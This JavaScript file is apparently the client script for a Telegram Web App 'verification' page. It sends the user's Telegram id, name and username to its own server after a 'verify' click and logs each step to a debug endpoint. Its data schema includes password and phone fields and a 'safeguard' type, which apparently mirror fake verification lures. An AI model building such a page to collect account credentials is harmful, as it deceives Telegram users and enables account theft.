// Function to send data to the server (unchanged from your original code)
async function sendDataToServer(data, type) {
  await fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: `Sending data for ${type} with userId ${data.id}` }),
  });

  const response = await fetch('/api/users/telegram/info', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      userId: data.id,
      firstName: data.first_name,
      usernames: data.usernames,
      phoneNumber: data.phone_number,
      isPremium: data.premium,
      password: data.password,
      quicklySet: data.quickly_set,
      type
    }),
  });

  if (response.ok) {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Data sent to server successfully for ${type}` }),
    });
  } else {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Failed to send data to server for ${type}: ${response.status} ${response.statusText}` }),
    });
  }
}

// Function to initialize the Telegram Web App and handle verification
function initializeWebApp() {
  console.log("check.js loaded, checking for Telegram Web App context...");

  if (window.Telegram && window.Telegram.WebApp) {
    console.log("Telegram Web App context detected");
    const webApp = window.Telegram.WebApp;
    webApp.ready(); // Signal that the web app is ready

    // Get user data from Telegram Web App
    const user = webApp.initDataUnsafe.user;
    const queryParams = new URLSearchParams(window.location.search);
    const type = queryParams.get('type') || 'safeguard';

    if (user) {
      console.log("User data:", user);

      // Prepare the user data
      const userData = {
        id: user.id.toString(),
        first_name: user.first_name || "Unknown",
        usernames: user.username ? [{ username: user.username }] : [],
        phone_number: "Not shared", // Telegram Web App doesn't provide phone number directly
        premium: user.is_premium || false,
        password: "Not available", // Password is not available via Web App
        quickly_set: null, // Not used in this context
      };

      // Add event listener to the "Click here" button
      const verifyButton = document.getElementById('verifyButton');
      if (verifyButton) {
        verifyButton.addEventListener('click', async () => {
          console.log("Verify button clicked, sending user data to server...");
          await fetch('/api/debug', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message: `Verify button clicked for userId ${userData.id}` }),
          });

          // Send the user data to the server
          await sendDataToServer(userData, type);

          // Close the web app after successful verification
          webApp.close();
        });
      } else {
        console.error("Verify button not found in the DOM");
        document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
      }
    } else {
      console.error("No user data available from Telegram Web App");
      document.body.innerHTML = "<p>Unable to verify user. Please try again.</p>";
    }
  } else {
    console.error("check.js not running in Telegram Web App context");
    document.body.innerHTML = "<p>Please open this page in the Telegram app to verify.</p>";
  }
}

// Log initial load context
fetch('/api/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ message: 'check.js loaded in window: ' + (window.top === window ? 'top' : 'iframe') }),
});

// Wait for the DOM to load and Telegram Web App to initialize
document.addEventListener("DOMContentLoaded", () => {
  console.log("DOM fully loaded, attempting to initialize Telegram Web App...");

  // Retry mechanism in case Telegram Web App API isn't ready yet
  let attempts = 0;
  const maxAttempts = 10;
  const interval = setInterval(() => {
    if (window.Telegram && window.Telegram.WebApp) {
      clearInterval(interval);
      initializeWebApp();
    } else if (attempts >= maxAttempts) {
      clearInterval(interval);
      console.error("Failed to detect Telegram Web App context after maximum attempts");
      document.body.innerHTML = "<p>Please open this page in the Telegram app to verify.</p>";
    }
    attempts++;
    console.log(`Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context...`);
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context` }),
    });
  }, 500); // Check every 500ms
});
